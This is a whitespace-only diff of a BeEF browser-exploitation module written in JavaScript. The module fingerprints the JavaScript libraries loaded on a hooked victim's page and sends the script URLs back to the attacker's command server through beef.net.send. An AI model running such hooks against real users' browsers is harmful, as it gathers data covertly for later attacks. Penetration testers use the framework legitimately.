@@ -5,11 +5,11 @@
 //
 
 beef.execute(function() {
-             
-     //Regular expression to match script names in source 
+
+     //Regular expression to match script names in source
      var regex = new RegExp('/\\w*\.(min\.)?js');
      var results = [];
-     var urls = "";  
+     var urls = "";
 
      Array.prototype.unique = function() {
          var o = {}, i, l = this.length, r = [];
@@ -17,8 +17,8 @@ beef.execute(function() {
          for(i in o) r.push(o[i]);
          return r;
      };
-     // Fingerprints of javascript /ajax libraries . Library Name: Array of common file names 
-     
+     // Fingerprints of javascript /ajax libraries . Library Name: Array of common file names
+
      var fingerprints = {
              "Prototype":new Array("prototype"),
              "script.aculous":new Array("builder","controls","dragdrop","effects","scriptaculous","slider","unittest"),
@@ -43,11 +43,11 @@ beef.execute(function() {
              "AJS": new Array ("AJS","AJS_fx"),
              "Greybox":new Array("gb_scripts.js"),
              "Qooxdoo":new Array("qx.website-devel","qooxdoo-1.6","qooxdoo-1.5.1","qxserver","q","q.domain","q.sticky","q.placeholder","shCore","shBrushScript"),
-               
+
      };
 
      function fp() {
-        try{ 
+        try{
             var sc = document.scripts;
             var urls ="";
             var source = ""
@@ -59,7 +59,7 @@ beef.execute(function() {
                         var comp = source.match(regex).toString().replace(new RegExp("/|.min|.pack|.uncompressed|.js\\W","g"),"");
                         for (key in fingerprints){
                             for (name in fingerprints[key]){
-                            // match name in the fingerprint object 
+                            // match name in the fingerprint object
                                 if(comp==fingerprints[key][name]){
                                     results.push("Lib:"+key+" src:"+source);
                                 }
@@ -74,7 +74,7 @@ beef.execute(function() {
             }
             else{
               beef.net.send("<%= @command_url %>", <%=  @command_id %>, "script_urls="+urls);
-          } 
+          }
         }
         catch(e){
             results = "Fingerprint failed: "+e.message;
